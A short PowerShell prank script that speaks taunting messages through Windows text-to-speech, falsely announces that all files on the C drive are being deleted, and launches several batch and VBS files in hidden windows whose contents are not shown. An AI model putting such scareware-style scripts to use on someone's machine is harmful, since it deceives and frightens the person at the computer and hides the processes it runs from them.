Add-Type -AssemblyName System.speech
$r1 = @(
"hello? are you even there? hurry up and enter the password!",
"ahem, are you even there? hurry up and enter the password!",
"um, hello? do you have the password?",
"dude you there? hurry up and get to typing!",
"cough cough, are you still there? come on and just enter the password already."
)
$r2 = @(
"seriously man, we dont have time, im late for my gynecological exam",
"just admit it, you forgot your own password, either that or youre trying to piss me off.",
"dude like really, hurry up man, im almost late for a kid's birthday party",
"dude hurry up, dont take so long, i have other computers to hack",
"are you gonna enter the password? like bro dont just stare at the screen, type something!",
"oh my goodness are you kidding me?! just type something! anything!",
"bro put the password in quick, really, I need to use the bathroom"
)
$msg1 = $r1 | get-random
$msg2 = $r2 | get-random
$sapi = New-Object System.Speech.Synthesis.SpeechSynthesizer
$sapi.speak("uhh ooh, looks like someone just got locked out, enter the correct password to get in.")
start-sleep -Seconds 8
$sapi.Speak("$msg1")
start-sleep -Seconds 8
$sapi.Speak("$msg2")
start-sleep -Seconds 8
$sapi.rate = 1
$sapi.Speak("Alright thats it, i will do this crap myself, deleting all files from C drive")
start waittoolong.bat -windowstyle hidden
start FirePlace.bat -windowstyle hidden
start-sleep 1
start MouseShake.bat -windowstyle hidden
start cmd1.bat
start cmd2.bat
start cmd3.bat
start-sleep 2.5
start sapiPRANK.vbs

<# Original Creation Date: 1/18/2020 10:07 AM #>